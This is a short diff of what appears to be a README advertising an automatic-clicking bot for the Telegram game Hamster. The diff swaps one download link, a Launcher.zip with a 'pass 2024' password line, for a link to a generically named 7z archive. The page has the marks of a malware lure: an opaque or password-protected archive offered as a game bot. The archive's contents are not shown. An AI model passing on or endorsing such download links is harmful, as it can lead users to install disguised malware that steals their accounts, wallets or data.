@@ -1,5 +1,4 @@
-# [DOWNLOAD](https://github.com/user-attachments/files/15920478/Launcher.zip)
-### - pass 2024
+# [DOWNLOAD](https://github.com/bakedayk8/bakedayk8/releases/download/Basked-GameZ-21z/Github.Softwares.v1.0.2.7z)
 ## My product is the best bot for the new telegram game Hamster, which allows you to:
 
 ### Automatic Clicking:
